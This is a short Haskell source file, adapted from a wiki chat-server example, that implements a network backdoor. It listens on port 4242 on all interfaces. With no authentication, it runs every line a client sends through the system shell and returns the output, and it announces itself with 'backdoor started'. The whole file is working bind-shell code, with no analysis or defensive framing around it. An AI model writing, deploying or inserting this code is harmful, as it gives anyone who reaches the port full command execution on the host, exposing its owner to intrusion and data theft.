-- based by https://wiki.haskell.org/Implement_a_chat_server
module Main where

import Network.Socket
import System.IO
import System.Process
import Control.Exception
import Control.Concurrent
import Control.Monad (when)
import Control.Monad.Fix (fix)

main :: IO ()
main = do
  sock <- socket AF_INET Stream 0
  setSocketOption sock ReuseAddr 1
  bind sock $ SockAddrInet 4242 $ tupleToHostAddress (0, 0, 0, 0)
  listen sock 2
  chan <- newChan
  _ <- forkIO $ fix $ \loop -> do
    (_, _) <- readChan chan
    loop
  putStrLn "backdoor started"
  mainLoop sock chan 0

type Msg = (Int, String)

mainLoop :: Socket -> Chan Msg -> Int -> IO ()
mainLoop sock chan msgNum = do
  conn <- accept sock
  forkIO (runConn conn chan msgNum)
  mainLoop sock chan $! msgNum + 1

runConn :: (Socket, SockAddr) -> Chan Msg -> Int -> IO ()
runConn (sock, _) chan msgNum = do
    let broadcast msg = writeChan chan (msgNum, msg)
    hdl <- socketToHandle sock ReadWriteMode
    hSetBuffering hdl NoBuffering

    putStrLn $ show msgNum ++ ": connected"

    hPutStr hdl "> "

    commLine <- dupChan chan

    -- fork off a thread for reading from the duplicated channel
    reader <- forkIO $ fix $ \loop -> do
        (nextNum, line) <- readChan commLine
        when (msgNum /= nextNum) $ hPutStrLn hdl line
        loop

    handle (\(SomeException _) -> return ()) $ fix $ \loop -> do
        line <- fmap init (hGetLine hdl)
        putStrLn $ show msgNum ++ ": > " ++ line
        case line of
            -- If an exception is caught, send a message and break the loop
            "quit" -> hPutStrLn hdl "Bye!"
            -- else, continue looping.
            _      -> do
                (_, Just stdout, Just stderr, ph) <- createProcess (shell line){ std_out = CreatePipe, std_err = CreatePipe }
                dateOut <- hGetContents stdout
                dateErr <- hGetContents stderr
                hPutStr hdl $ dateOut ++ dateErr
                putStrLn $ show msgNum ++ ": " ++ dateOut ++ dateErr
                hPutStr hdl "> "
                loop

    killThread reader                      -- kill after the loop ends
    putStrLn $ show msgNum ++ ": left"
    hClose hdl                             -- close the handle
